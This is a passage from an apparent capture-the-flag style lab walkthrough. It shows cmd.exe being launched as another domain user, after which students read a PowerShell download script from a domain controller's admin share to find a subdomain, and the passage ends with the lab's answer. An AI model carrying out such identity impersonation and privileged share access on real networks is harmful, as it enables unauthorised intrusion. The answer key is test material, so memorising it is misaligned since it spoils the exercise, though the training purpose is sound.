Attempting to start cmd.exe as user "legacy\admin.user" ...
```

Subsequently, students will use the newly spawned Command Prompt to find the (sub)domain:

```cmd
type \\dc01\ADMINS$\remote.ps1
```
```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type \\dc01\ADMINS$\remote.ps1

$remoteFileUrl = "https://{hidden}/secretfile.txt"
$destinationPath = "C:\Users\Public\secretfile.txt"
try {
    Invoke-WebRequest -Uri $remoteFileUrl -OutFile $destinationPath
    Write-Host "File downloaded successfully to $destinationPath"
} catch {
    Write-Host "Failed to download the file. Error: $_"
}
```

Answer: `token-assessment.htb.local`